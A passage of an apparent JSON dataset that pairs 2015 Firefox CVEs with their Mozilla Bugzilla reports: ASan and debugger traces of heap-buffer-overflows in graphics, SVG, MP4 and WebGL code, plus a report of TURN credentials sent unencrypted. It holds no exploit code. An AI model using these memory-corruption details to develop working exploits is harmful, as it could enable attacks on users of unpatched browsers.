/builds/slave/m-cen-l64-asan-000000000000000/build/gfx/thebes/gfxTextRun.cpp:1907:0 #4 0x7f5f34cfe45d in MakeTextRun<unsigned char> /builds/slave/m-cen-l64-asan-000000000000000/build/layout/generic/nsTextFrame.cpp:566:0 #5 0x7f5f34cfe45d in BuildTextRunsScanner::BuildTextRunForFrames(void*) /builds/slave/m-cen-l64-asan-000000000000000/build/layout/generic/nsTextFrame.cpp:2164:0 #6 0x7f5f34cf9120 in BuildTextRunsScanner::FlushFrames(bool, bool) /builds/slave/m-cen-l64-asan-000000000000000/build/layout/generic/nsTextFrame.cpp:1481:0 #7 0x7f5f34d015fd in BuildTextRunsScanner::ScanFrame(nsIFrame*) /builds/slave/m-cen-l64-asan-000000000000000/build/layout/generic/nsTextFrame.cpp:1702:0 . . ."
      }
    ],
    "CVE-2015-0827": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1117304",
        "title": "Heap-buffer-overflow write in mozilla::gfx::CopyRect",
        "description": "================================================================= ==16794==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7f398b43d56f at pc 0x7f39a2568a2d bp 0x7fff0e98b4a0 sp 0x7fff0e98b498 WRITE of size 16 at 0x7f398b43d56f thread T0 (Web Content) #0 0x7f39a2568a2c in mozilla::gfx::CopyRect(mozilla::gfx::DataSourceSurface*, mozilla::gfx::DataSourceSurface*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits>, mozilla::gfx::IntPointTyped<mozilla::gfx::UnknownUnits>) objdir-ff-asan/dist/include/mozilla/PodOperations.h:87:3 #1 0x7f39a25b3559 in mozilla::gfx::FilterNodeTileSoftware::Render(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) gfx/2d/FilterNodeSoftware.cpp:1552:7 #2 0x7f39a25a2f6a in mozilla::gfx::FilterNodeSoftware::GetOutput(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) gfx/2d/FilterNodeSoftware.cpp:604:21 #3 0x7f39a25a8710 in mozilla::gfx::FilterNodeSoftware::GetInputDataSourceSurface(unsigned int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::FilterNodeSoftware::FormatHint, mozilla::gfx::ConvolveMatrixEdgeMode, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) gfx/2d/FilterNodeSoftware.cpp:698:17 #4 0x7f39a25c985d in mozilla::gfx::FilterNodeCropSoftware::Render(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) gfx/2d/FilterNodeSoftware.cpp:3004:10 #5 0x7f39a25a2f6a in mozilla::gfx::FilterNodeSoftware::GetOutput(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) gfx/2d/FilterNodeSoftware.cpp:604:21 #6 0x7f39a25a8710 in mozilla::gfx::FilterNodeSoftware::GetInputDataSourceSurface(unsigned int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::FilterNodeSoftware::FormatHint, mozilla::gfx::ConvolveMatrixEdgeMode, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) gfx/2d/FilterNodeSoftware.cpp:698:17 #7 0x7f39a25ca1d9 in mozilla::gfx::FilterNodeUnpremultiplySoftware::Render(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) gfx/2d/FilterNodeSoftware.cpp:3061:5 #8 0x7f39a25a2f6a in mozilla::gfx::FilterNodeSoftware::GetOutput(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) gfx/2d/FilterNodeSoftware.cpp:604:21 #9 0x7f39a25a8710 in mozilla::gfx::FilterNodeSoftware::GetInputDataSourceSurface(unsigned int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::FilterNodeSoftware::FormatHint, mozilla::gfx::ConvolveMatrixEdgeMode, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) gfx/2d/FilterNodeSoftware.cpp:698:17 #10 0x7f39a25b4e8f in mozilla::gfx::FilterNodeComponentTransferSoftware::Render(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) gfx/2d/FilterNodeSoftware.cpp:1680:5 #11 0x7f39a25a2f6a in mozilla::gfx::FilterNodeSoftware::GetOutput(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) gfx/2d/FilterNodeSoftware.cpp:604:21 #12 0x7f39a25a8710 in mozilla::gfx::FilterNodeSoftware::GetInputDataSourceSurface(unsigned int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::FilterNodeSoftware::FormatHint, mozilla::gfx::ConvolveMatrixEdgeMode, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) gfx/2d/FilterNodeSoftware.cpp:698:17 #13 0x7f39a25c9fd9 in mozilla::gfx::FilterNodePremultiplySoftware::Render(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) gfx/2d/FilterNodeSoftware.cpp:3032:5 #14 0x7f39a25a2f6a in mozilla::gfx::FilterNodeSoftware::GetOutput(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) gfx/2d/FilterNodeSoftware.cpp:604:21 #15 0x7f39a256dbba in mozilla::gfx::FilterNodeSoftware::Draw(mozilla::gfx::DrawTarget*, mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::PointTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::DrawOptions const&) gfx/2d/FilterNodeSoftware.cpp:557:14 #16 0x7f39a2630f76 in mozilla::gfx::FilterSupport::RenderFilterDescription(mozilla::gfx::DrawTarget*, mozilla::gfx::FilterDescription const&, mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SourceSurface*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SourceSurface*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SourceSurface*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, nsTArray<mozilla::RefPtr<mozilla::gfx::SourceSurface> >&, mozilla::gfx::PointTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::DrawOptions const&) gfx/src/FilterSupport.cpp:1249:3 #17 0x7f39a65b77e5 in nsFilterInstance::Render(gfxContext*) layout/svg/nsFilterInstance.cpp:486:3 #18 0x7f39a65b6c66 in nsFilterInstance::PaintFilteredFrame(nsIFrame*, gfxContext&, gfxMatrix const&, nsSVGFilterPaintCallback*, nsRegion const*) layout/svg/nsFilterInstance.cpp:74:10 #19 0x7f39a65eee5d in nsSVGIntegrationUtils::PaintFramesWithEffects(gfxContext&, nsIFrame*, nsRect const&, nsDisplayListBuilder*, mozilla::layers::LayerManager*) layout/svg/nsSVGIntegrationUtils.cpp:543:5 #20 0x7f39a5fca1ee in mozilla::FrameLayerBuilder::PaintItems(nsTArray<mozilla::FrameLayerBuilder::ClippedDisplayItem>&, nsIntRect const&, gfxContext*, nsRenderingContext*, nsDisplayListBuilder*, nsPresContext*, nsIntPoint const&, float, float, int) layout/base/FrameLayerBuilder.cpp:2665:5 #21 0x7f39a5fccee1 in mozilla::FrameLayerBuilder::DrawPaintedLayer(mozilla::layers::PaintedLayer*, gfxContext*, nsIntRegion const&, mozilla::layers::DrawRegionClip, nsIntRegion const&, void*) layout/base/FrameLayerBuilder.cpp:4630:5 #22 0x7f39a27a7600 in mozilla::layers::BasicPaintedLayer::PaintThebes(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::PaintedLayer*, gfxContext*, nsIntRegion const&, mozilla::layers::DrawRegionClip, nsIntRegion const&, void*), void*) gfx/layers/basic/BasicPaintedLayer.cpp:94:7 #23 0x7f39a27a2b09 in mozilla::layers::BasicLayerManager::PaintSelfOrChildren(mozilla::layers::PaintLayerContext&, gfxContext*) gfx/layers/basic/BasicLayerManager.cpp:724:7 #24 0x7f39a279fe87 in mozilla::layers::BasicLayerManager::PaintLayer(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::PaintedLayer*, gfxContext*, nsIntRegion const&, mozilla::layers::DrawRegionClip, nsIntRegion const&, void*), void*) gfx/layers/basic/BasicLayerManager.cpp:838:5 #25 0x7f39a27a2925 in mozilla::layers::BasicLayerManager::PaintSelfOrChildren(mozilla::layers::PaintLayerContext&, gfxContext*) gfx/layers/basic/BasicLayerManager.cpp:737:7 #26 0x7f39a279fe87 in mozilla::layers::BasicLayerManager::PaintLayer(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::PaintedLayer*, gfxContext*, nsIntRegion const&, mozilla::layers::DrawRegionClip, nsIntRegion const&, void*), void*) gfx/layers/basic/BasicLayerManager.cpp:838:5 #27 0x7f39a279b3ca in mozilla::layers::BasicLayerManager::EndTransactionInternal(void (*)(mozilla::layers::PaintedLayer*, gfxContext*, nsIntRegion const&, mozilla::layers::DrawRegionClip, nsIntRegion const&, void*), void*, mozilla::layers::LayerManager::EndTransactionFlags) gfx/layers/basic/BasicLayerManager.cpp:528:5 #28 0x7f39a5fca23a in mozilla::FrameLayerBuilder::PaintItems(nsTArray<mozilla::FrameLayerBuilder::ClippedDisplayItem>&, nsIntRect const&, gfxContext*, nsRenderingContext*, nsDisplayListBuilder*, nsPresContext*, nsIntPoint const&, float, float, int) layout/base/FrameLayerBuilder.cpp:2670:5 #29 0x7f39a5fccee1 in mozilla::FrameLayerBuilder::DrawPaintedLayer(mozilla::layers::PaintedLayer*, gfxContext*, nsIntRegion const&, mozilla::layers::DrawRegionClip, nsIntRegion const&, void*) layout/base/FrameLayerBuilder.cpp:4630:5 #30 0x7f39a27b7204 in mozilla::layers::ClientPaintedLayer::PaintThebes() gfx/layers/client/ClientPaintedLayer.cpp:76:5 #31 0x7f39a27b7c98 in mozilla::layers::ClientPaintedLayer::RenderLayerWithReadback(mozilla::layers::ReadbackProcessor*) gfx/layers/client/ClientPaintedLayer.cpp:131:3 #32 0x7f39a27d3227 in mozilla::layers::ClientContainerLayer::RenderLayer() gfx/layers/client/ClientContainerLayer.h:69:7 #33 0x7f39a27b270b in mozilla::layers::ClientLayerManager::EndTransactionInternal(void (*)(mozilla::layers::PaintedLayer*, gfxContext*, nsIntRegion const&, mozilla::layers::DrawRegionClip, nsIntRegion const&, void*), void*, mozilla::layers::LayerManager::EndTransactionFlags) gfx/layers/client/ClientLayerManager.cpp:268:3 #34 0x7f39a27b2d9b in mozilla::layers::ClientLayerManager::EndTransaction(void (*)(mozilla::layers::PaintedLayer*, gfxContext*, nsIntRegion const&, mozilla::layers::DrawRegionClip, nsIntRegion const&, void*), void*, mozilla::layers::LayerManager::EndTransactionFlags) gfx/layers/client/ClientLayerManager.cpp:303:3 #35 0x7f39a60e92e1 in nsDisplayList::PaintRoot(nsDisplayListBuilder*, nsRenderingContext*, unsigned int) layout/base/nsDisplayList.cpp:1642:3 #36 0x7f39a616bf0e in nsLayoutUtils::PaintFrame(nsRenderingContext*, nsIFrame*, nsRegion const&, unsigned int, unsigned int) layout/base/nsLayoutUtils.cpp:3177:5 #37 0x7f39a61ef845 in PresShell::Paint(nsView*, nsRegion const&, unsigned int) layout/base/nsPresShell.cpp:6345:5 #38 0x7f39a5957292 in nsViewManager::ProcessPendingUpdatesPaint(nsIWidget*) view/nsViewManager.cpp:443:7 #39 0x7f39a5956ade in nsViewManager::ProcessPendingUpdatesForView(nsView*, bool) view/nsViewManager.cpp:384:9 #40 0x7f39a5f814d7 in nsRefreshDriver::Tick(long, mozilla::TimeStamp) layout/base/nsRefreshDriver.cpp:1386:5 #41 0x7f39a5f874d6 in mozilla::RefreshDriverTimer::Tick() layout/base/nsRefreshDriver.cpp:177:5 #42 0x7f39a0efe325 in nsTimerImpl::Fire() xpcom/threads/nsTimerImpl.cpp:631:7 #43 0x7f39a0efefc0 in nsTimerEvent::Run() xpcom/threads/nsTimerImpl.cpp:724:3 #44 0x7f39a0ef4f36 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:855:7 #45 0x7f39a0f4be16 in NS_ProcessNextEvent(nsIThread*, bool) xpcom/glue/nsThreadUtils.cpp:265:10 #46 0x7f39a1775aaf in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:99:21 #47 0x7f39a1726de1 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:233:3 #48 0x7f39a59890ff in nsBaseAppShell::Run() widget/nsBaseAppShell.cpp:164:3 #49 0x7f39a74454d2 in XRE_RunAppShell toolkit/xre/nsEmbedFunctions.cpp:734:12 #50 0x7f39a1726de1 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:233:3 #51 0x7f39a744490b in XRE_InitChildProcess toolkit/xre/nsEmbedFunctions.cpp:571:7 #52 0x4bbc7e in content_process_main(int, char**) ipc/contentproc/plugin-container.cpp:211:19 #53 0x7f399e55eec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287 0x7f398b43d56f is located 0 bytes to the right of 589167-byte region [0x7f398b3ad800,0x7f398b43d56f) allocated by thread T0 (Web Content) here: #0 0x499a39 in __interceptor_malloc _asan_rtl_ #1 0x7f39a261cb16 in mozilla::gfx::SourceSurfaceAlignedRawData::Init(mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SurfaceFormat, bool) gfx/2d/Tools.h:160:41 #2 0x7f39a256924a in mozilla::gfx::Factory::CreateDataSourceSurface(mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SurfaceFormat, bool) gfx/2d/Factory.cpp:807:7 #3 0x7f39a25b3435 in mozilla::gfx::FilterNodeTileSoftware::Render(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) gfx/2d/FilterNodeSoftware.cpp:1545:18 #4 0x7f39a25a2f6a in mozilla::gfx::FilterNodeSoftware::GetOutput(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) gfx/2d/FilterNodeSoftware.cpp:604:21 #5 0x7f39a25a8710 in mozilla::gfx::FilterNodeSoftware::GetInputDataSourceSurface(unsigned int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::FilterNodeSoftware::FormatHint, mozilla::gfx::ConvolveMatrixEdgeMode, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) gfx/2d/FilterNodeSoftware.cpp:698:17 #6 0x7f39a25c985d in mozilla::gfx::FilterNodeCropSoftware::Render(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) gfx/2d/FilterNodeSoftware.cpp:3004:10 #7 0x7f39a25a2f6a in mozilla::gfx::FilterNodeSoftware::GetOutput(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) gfx/2d/FilterNodeSoftware.cpp:604:21 #8 0x7f39a25a8710 in mozilla::gfx::FilterNodeSoftware::GetInputDataSourceSurface(unsigned int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::FilterNodeSoftware::FormatHint, mozilla::gfx::ConvolveMatrixEdgeMode, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) gfx/2d/FilterNodeSoftware.cpp:698:17 #9 0x7f39a25ca1d9 in mozilla::gfx::FilterNodeUnpremultiplySoftware::Render(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) gfx/2d/FilterNodeSoftware.cpp:3061:5 #10 0x7f39a25a2f6a in mozilla::gfx::FilterNodeSoftware::GetOutput(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) gfx/2d/FilterNodeSoftware.cpp:604:21 #11 0x7f39a25a8710 in mozilla::gfx::FilterNodeSoftware::GetInputDataSourceSurface(unsigned int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::FilterNodeSoftware::FormatHint, mozilla::gfx::ConvolveMatrixEdgeMode, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) gfx/2d/FilterNodeSoftware.cpp:698:17 #12 0x7f39a25b4e8f in mozilla::gfx::FilterNodeComponentTransferSoftware::Render(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) gfx/2d/FilterNodeSoftware.cpp:1680:5 #13 0x7f39a25a2f6a in mozilla::gfx::FilterNodeSoftware::GetOutput(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) gfx/2d/FilterNodeSoftware.cpp:604:21 #14 0x7f39a25a8710 in mozilla::gfx::FilterNodeSoftware::GetInputDataSourceSurface(unsigned int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::FilterNodeSoftware::FormatHint, mozilla::gfx::ConvolveMatrixEdgeMode, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) gfx/2d/FilterNodeSoftware.cpp:698:17 #15 0x7f39a25c9fd9 in mozilla::gfx::FilterNodePremultiplySoftware::Render(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) gfx/2d/FilterNodeSoftware.cpp:3032:5 #16 0x7f39a25a2f6a in mozilla::gfx::FilterNodeSoftware::GetOutput(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) gfx/2d/FilterNodeSoftware.cpp:604:21 #17 0x7f39a256dbba in mozilla::gfx::FilterNodeSoftware::Draw(mozilla::gfx::DrawTarget*, mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::PointTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::DrawOptions const&) gfx/2d/FilterNodeSoftware.cpp:557:14 #18 0x7f39a2630f76 in mozilla::gfx::FilterSupport::RenderFilterDescription(mozilla::gfx::DrawTarget*, mozilla::gfx::FilterDescription const&, mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SourceSurface*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SourceSurface*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SourceSurface*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, nsTArray<mozilla::RefPtr<mozilla::gfx::SourceSurface> >&, mozilla::gfx::PointTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::DrawOptions const&) gfx/src/FilterSupport.cpp:1249:3 #19 0x7f39a65b77e5 in nsFilterInstance::Render(gfxContext*) layout/svg/nsFilterInstance.cpp:486:3 #20 0x7f39a65b6c66 in nsFilterInstance::PaintFilteredFrame(nsIFrame*, gfxContext&, gfxMatrix const&, nsSVGFilterPaintCallback*, nsRegion const*) layout/svg/nsFilterInstance.cpp:74:10 #21 0x7f39a65eee5d in nsSVGIntegrationUtils::PaintFramesWithEffects(gfxContext&, nsIFrame*, nsRect const&, nsDisplayListBuilder*, mozilla::layers::LayerManager*) layout/svg/nsSVGIntegrationUtils.cpp:543:5 #22 0x7f39a5fca1ee in mozilla::FrameLayerBuilder::PaintItems(nsTArray<mozilla::FrameLayerBuilder::ClippedDisplayItem>&, nsIntRect const&, gfxContext*, nsRenderingContext*, nsDisplayListBuilder*, nsPresContext*, nsIntPoint const&, float, float, int) layout/base/FrameLayerBuilder.cpp:2665:5 #23 0x7f39a5fccee1 in mozilla::FrameLayerBuilder::DrawPaintedLayer(mozilla::layers::PaintedLayer*, gfxContext*, nsIntRegion const&, mozilla::layers::DrawRegionClip, nsIntRegion const&, void*) layout/base/FrameLayerBuilder.cpp:4630:5 #24 0x7f39a27a7600 in mozilla::layers::BasicPaintedLayer::PaintThebes(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::PaintedLayer*, gfxContext*, nsIntRegion const&, mozilla::layers::DrawRegionClip, nsIntRegion const&, void*), void*) gfx/layers/basic/BasicPaintedLayer.cpp:94:7 #25 0x7f39a27a2b09 in mozilla::layers::BasicLayerManager::PaintSelfOrChildren(mozilla::layers::PaintLayerContext&, gfxContext*) gfx/layers/basic/BasicLayerManager.cpp:724:7 #26 0x7f39a279fe87 in mozilla::layers::BasicLayerManager::PaintLayer(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::PaintedLayer*, gfxContext*, nsIntRegion const&, mozilla::layers::DrawRegionClip, nsIntRegion const&, void*), void*) gfx/layers/basic/BasicLayerManager.cpp:838:5 #27 0x7f39a27a2925 in mozilla::layers::BasicLayerManager::PaintSelfOrChildren(mozilla::layers::PaintLayerContext&, gfxContext*) gfx/layers/basic/BasicLayerManager.cpp:737:7 #28 0x7f39a279fe87 in mozilla::layers::BasicLayerManager::PaintLayer(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::PaintedLayer*, gfxContext*, nsIntRegion const&, mozilla::layers::DrawRegionClip, nsIntRegion const&, void*), void*) gfx/layers/basic/BasicLayerManager.cpp:838:5 #29 0x7f39a279b3ca in mozilla::layers::BasicLayerManager::EndTransactionInternal(void (*)(mozilla::layers::PaintedLayer*, gfxContext*, nsIntRegion const&, mozilla::layers::DrawRegionClip, nsIntRegion const&, void*), void*, mozilla::layers::LayerManager::EndTransactionFlags) gfx/layers/basic/BasicLayerManager.cpp:528:5 SUMMARY: AddressSanitizer: heap-buffer-overflow ??:0 ?? Shadow bytes around the buggy address: 0x0fe7b167fa50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0fe7b167fa60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0fe7b167fa70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0fe7b167fa80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0fe7b167fa90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x0fe7b167faa0: 00 00 00 00 00 00 00 00 00 00 00 00 00[07]fa fa 0x0fe7b167fab0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0fe7b167fac0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0fe7b167fad0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0fe7b167fae0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0fe7b167faf0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac ASan internal: fe ==16794==ABORTING"
      }
    ],
    "CVE-2015-0829": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1128939",
        "title": "MP4 crash access violation",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36 Steps to reproduce: firefox.exe crashowa.mp4 Actual results: Firefox 35.0.1 - crash nightly - tab crash (b4c.8ec): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. *** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\\Program Files (x86)\\Mozilla Firefox\\MSVCR100.dll - *** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\\Program Files (x86)\\Mozilla Firefox\\xul.dll - MSVCR100!wcspbrk+0xa8: 66dc0ab6 660f7f7760 movdqa xmmword ptr [edi+60h],xmm6 ds:002b:12519000=???????????????????????????????? Expected results: error: invalid mp4 file"
      }
    ],
    "CVE-2015-0830": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1110488",
        "title": "webgl shader compilation log strcpy not allocated memory",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0 Iceweasel/34.0 Build ID: 20141203163643 Steps to reproduce: I opened the attached file with - Firefox 34 on ubuntu with NVIDIA closed source drivers - Iceweasel 31 on debian (jessie) with NVIDIA closed source drivers - Icewease 34 on debian (experimental) with NVIDIA closed source drivers Actual results: In all three configurations a segmentation fault happened (consistently). I haven't had the chance to test it with non NVIDIA drivers or on windows. It may be related to NVIDIA drivers, but I suspect the bug to be in FF code. This is a backtrace (iceweasel 31): #0 __strcpy_ssse3 () at ../sysdeps/x86_64/multiarch/strcpy-ssse3.S:2289 #1 0x00007ffff3d0f87c in mozilla::WebGLContext::CompileShader (this=0x7fffc3a2e9c0, shader=0x7fffc3a2e940) at /tmp/buildd/iceweasel-31.3.0esr/content/canvas/src/WebGLContextGL.cpp:3135 #2 0x00007ffff3916f33 in mozilla::dom::WebGLRenderingContextBinding::compileShader (cx=0x7fffd2d08a80, obj=..., self=0x7fffc34a7c00, args=...) at /tmp/buildd/iceweasel-31.3.0esr/build-browser/dom/bindings/WebGLRenderingContextBinding.cpp:8225 #3 0x00007ffff395beea in mozilla::dom::GenericBindingMethod (cx=0x7fffd2d08a80, argc=<optimized out>, vp=<optimized out>) at /tmp/buildd/iceweasel-31.3.0esr/dom/bindings/BindingUtils.cpp:2297 #4 0x00007ffff4959a01 in CallJSNative (args=..., native=<optimized out>, cx=<optimized out>) at /tmp/buildd/iceweasel-31.3.0esr/js/src/jscntxtinlines.h:239 #5 js::Invoke (cx=0x7fffd2d08a80, args=..., construct=(js::CONSTRUCT | unknown: 4154173016)) at /tmp/buildd/iceweasel-31.3.0esr/js/src/vm/Interpreter.cpp:475 #6 0x00007ffff49501d2 in Interpret (cx=0x7fffd2d08a80, state=...) at /tmp/buildd/iceweasel-31.3.0esr/js/src/vm/Interpreter.cpp:2620 #7 0x00007ffff4959669 in js::RunScript (cx=0x7fffd2d08a80, state=...) at /tmp/buildd/iceweasel-31.3.0esr/js/src/vm/Interpreter.cpp:422 #8 0x00007ffff49598d9 in js::Invoke (cx=0x7fffd2d08a80, args=..., construct=(js::CONSTRUCT | unknown: 4154173016), construct@entry=js::NO_CONSTRUCT) at /tmp/buildd/iceweasel-31.3.0esr/js/src/vm/Interpreter.cpp:494 It appears that compiler->getInfoSink().info.size() is 0 in ShGetInfo() lenWithNull is 1 in WebGLContext::CompileShader(), therefore len is 0 and the new memory is not allocated. I'm not sure this is actually a security issue, but maybe there could be a way to control the pointers involved in the strcpy() and do nasty things."
      }
    ],
    "CVE-2015-0834": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1098314",
        "title": "TLS connection to a TURN server is not being secured",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0 Build ID: 20141106120505 Steps to reproduce: Not sure about the Core's branch version. I'm using Firefox 33.1 0. Make sure your PC is firewalled, so you're able to reach ports 80 and 443 only. 1. Open http://sipml5.org/call.htm# 2. Specify credentials for a SIP server 3. Click on Expert mode button 4. Check \"Enable RTCWeb Breaker\" 5. Put appropriate in \"WebSocket Server URL\" 6. Specify ICE Servers: [{url: 'turns:myturnserver.domain.com:443?transport=tcp',credential: 'testpass',username: 'testuser'}] 7. Save and close the expert tab 8. Log into the SIP server and make a call Actual results: Login credentials sent to TURN server unencrypted. Here is a TURN server log excerpt: 83037: IPv4. tcp or tls connected to: xx.xx.238.165:29129 83037: session 000000000000001401: user <>: incoming packet message processed, error 401: Unauthorised ... 83037: IPv4. Local relay addr: 172.30.1.191:49765 83037: session 000000000000001401: new, username=<testuser>, lifetime=3600 83037: session 000000000000001401: user <testuser>: incoming packet ALLOCATE processed, success .... Expected results: Traffic to TURN server should be encrypted. Here is how the TURN's log should look like: 83210: IPv4. tcp or tls connected to: xx.xx.238.165:20493 83210: session 000000000000001430: user <>: incoming packet message processed, error 401: Unauthorised 83210: IPv4. Local relay addr: 172.30.1.191:53728 83210: session 000000000000001430: new, username=<testuser>, lifetime=600, cipher=ECDHE-RSA-AES256-SHA, method=TLSv1.2 (TLSv1.2) 83210: session 000000000000001430: user <testuser>: incoming packet ALLOCATE processed, success ... Same settings under Chrome browser work correctly."
      }
    ],
    "CVE-2015-2710": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1149542",
        "title": "Heap-buffer-overflow in SVGTextFrame::ResolvePositions",
        "description": "Tested on: OS: Ubuntu 14.04 Firefox: ASAN build from https://ftp.mozilla.org/pub/mozilla.org/firefox/tinderbox-builds/mozilla-central-linux64-asan/1427796124/ Note: Repro-file will also crash stable Firefox 36.0.4 on Ubuntu 14.04 Crash report-ID: bp-6e47afc4-a88c-4cf3-a591-0a0552150331 ASAN-trace: ==1594==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x621000e67503 at pc 0x7fdce471f097 bp 0x7fffec35a250 sp 0x7fffec35a248 WRITE of size 1 at 0x621000e67503 thread T0 (Web Content) #0 0x7fdce471f096 in SVGTextFrame::ResolvePositions(nsIContent*, unsigned int, bool, bool&, nsTArray<gfxPoint>&) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/svg/SVGTextFrame.cpp:4403 #1 0x7fdce471ee90 in SVGTextFrame::ResolvePositions(nsIContent*, unsigned int, bool, bool&, nsTArray<gfxPoint>&) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/svg/SVGTextFrame.cpp:4519 #2 0x7fdce47203b5 in SVGTextFrame::ResolvePositions(nsTArray<gfxPoint>&, bool) 